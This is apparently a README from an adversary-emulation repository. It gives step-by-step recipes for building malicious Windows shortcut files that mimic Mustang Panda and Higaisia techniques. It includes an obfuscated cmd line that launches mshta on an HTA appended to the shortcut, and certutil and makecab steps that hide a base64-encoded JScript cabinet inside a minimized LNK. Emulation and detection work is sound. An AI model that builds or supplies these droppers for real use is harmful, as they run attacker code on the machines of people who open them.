# LNKs

|Name|Description|
|--|--|
|Mustang Panda|Calls MSHTA on itself to execute an embedded HTA|
|Higaisia|Drops an embedded base64-encoded cabinet file to disk, decodes it, extracts a JScript file from the cabainet, then executes the script with WScript|

## Steps to Reproduce

### Mustang Panda

1. create a shortcut
2. create an HTA file containing your code
	- included is the HTA used in the provided lnk
3. In the lnk's target property, set the following command:

	```
	C:\Windows\System32\cmd.exe /c %comspec% /c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f "delims==" %i in ('dir "%x\newfile.lnk" /s /b') do start %TEMP:~-2,1%%windir:~-1,1%h%TEMP:~-13,1%%TEMP:~-7,1%.exe "%i"
	``` 
4. concatenate the two files together (lnk first)
	- > cmd> copy file.lnk+file.hta newfile.lnk
5. (optional) set the LNK's run property to "minimized"

*note: this payload will fail to run properly when the path contains a space*

### Higaisia

1. Create a cabinet file of the higaisia.js file and any other file (e.g. an empty text file; minimum 1 additional file)
	- > cmd> makecab /F files.txt /d CabinetName1=file.cab /D DiskDirectoryTemplate=<path to dir>
		- files.txt = list of files
		- put the directory where you want to store the cab as the directory template
2. Base64 encode the cabinet
	- > cmd> certutil -encode file.cab file.cab.b64
		- delete the certificate lines from the new file (first and last), then delete all newlines, finally add a newline at the start of the file
3. Create a shortcut file. Since the command will be longer than the GUI allows, use PowerShell 
	- example:
		```
		ps> $wssh = new-object -comobject wscript.shell
		$lnk = $wssh.createshortcut("path1\base.lnk")
		$lnk.windowstyle = "7"
		$lnk.targetpath = "C:\Windows\System32\cmd.exe"
		$lnk.arguments = (gc path2\higaisia.bat)
		$lnk.save()
		```
		- path1 = where you want to save the lnk
		- path2 = path where higaisia.bat is location (this directory)
		- higaisia.bat assumes the lnk will be called higaisia.lnk - change as needed
4. Concatenate the lnk and base64
	- > cmd> copy /b file.lnk+file.cab higaisia.lnk

